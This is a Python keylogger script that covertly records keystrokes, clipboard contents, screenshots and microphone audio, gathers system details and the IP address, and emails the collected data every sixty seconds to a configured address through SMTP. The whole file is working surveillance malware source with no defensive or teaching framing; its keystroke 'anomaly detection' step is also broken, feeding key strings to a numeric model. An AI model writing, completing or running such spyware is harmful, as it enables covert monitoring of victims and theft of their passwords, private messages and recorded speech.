import smtplib
import time
import os
import subprocess
import psutil
import pyperclip
import pyscreenshot as ImageGrab
import sounddevice as sd
import wavio
import numpy as np
from pynput.keyboard import Listener
from sklearn.ensemble import IsolationForest
from datetime import datetime

# Placeholder for email credentials
EMAIL_ADDRESS = "your_email@example.com"
EMAIL_PASSWORD = "your_password"

# Set up email settings
TO_EMAIL = "recipient_email@example.com"
SMTP_SERVER = "smtp.mailtrap.io"
SMTP_PORT = 587

# Initialize variables
keystroke_data = []
anomalies_detected = []

# Define the function to record audio
def record_audio(filename="audio_recording.wav"):
    fs = 44100  # Sample rate
    duration = 10  # seconds
    print("Recording audio...")
    recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
    sd.wait()
    wavio.write(filename, recording, fs)
    print(f"Audio saved as {filename}")
    return filename

# Define the function to take a screenshot
def take_screenshot():
    screenshot = ImageGrab.grab()
    screenshot_filename = f"screenshot_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png"
    screenshot.save(screenshot_filename)
    print(f"Screenshot saved as {screenshot_filename}")
    return screenshot_filename

# Define the function to send email with logs
def send_email(subject, body, attachments=None):
    try:
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        message = f"Subject: {subject}\n\n{body}"
        
        if attachments:
            for attachment in attachments:
                with open(attachment, "rb") as file:
                    server.sendmail(EMAIL_ADDRESS, TO_EMAIL, message, file.read())
        else:
            server.sendmail(EMAIL_ADDRESS, TO_EMAIL, message)
        server.quit()
        print("Email sent successfully.")
    except Exception as e:
        print(f"Error sending email: {e}")

# Define function to capture keystrokes
def on_press(key):
    try:
        keystroke_data.append(key.char)
    except AttributeError:
        keystroke_data.append(str(key))

# Define function to monitor system information
def get_system_info():
    system_info = {
        "os": os.name,
        "cpu_count": psutil.cpu_count(),
        "cpu_usage": psutil.cpu_percent(interval=1),
        "memory_info": psutil.virtual_memory()._asdict(),
        "disk_usage": psutil.disk_usage('/')._asdict(),
        "ip_address": subprocess.getoutput("hostname -I").strip()
    }
    return system_info

# Define function to collect clipboard data
def get_clipboard_data():
    return pyperclip.paste()

# Define function to detect anomalies in keystroke data
def detect_anomalies(data):
    if len(data) < 10:  # If we don't have enough data, we can't detect anomalies
        return False
    
    # Using IsolationForest to detect anomalies
    model = IsolationForest(contamination=0.1)
    keystroke_matrix = np.array(data).reshape(-1, 1)
    model.fit(keystroke_matrix)
    anomalies = model.predict(keystroke_matrix)
    return np.any(anomalies == -1)  # Return True if anomaly is detected

# Define function to gather logs and send report
def gather_logs_and_send_report():
    # Get system information
    system_info = get_system_info()

    # Get clipboard data
    clipboard_data = get_clipboard_data()

    # Take a screenshot and record audio
    screenshot_filename = take_screenshot()
    audio_filename = record_audio()

    # Check for anomalies in keystroke data
    if detect_anomalies(keystroke_data):
        anomalies_detected.append(datetime.now())

    # Prepare email body
    report = f"System Info: {system_info}\nClipboard Data: {clipboard_data}\n"
    report += f"Anomalies Detected: {len(anomalies_detected)}\n"
    report += f"Time of report: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

    # Send email with attached files (screenshot, audio)
    send_email(
        subject="Keylogger Report",
        body=report,
        attachments=[screenshot_filename, audio_filename]
    )

# Start the keystroke listener
with Listener(on_press=on_press) as listener:
    print("Keylogger is running...")
    while True:
        time.sleep(60)  # Capture data and send report every 60 seconds
        gather_logs_and_send_report()
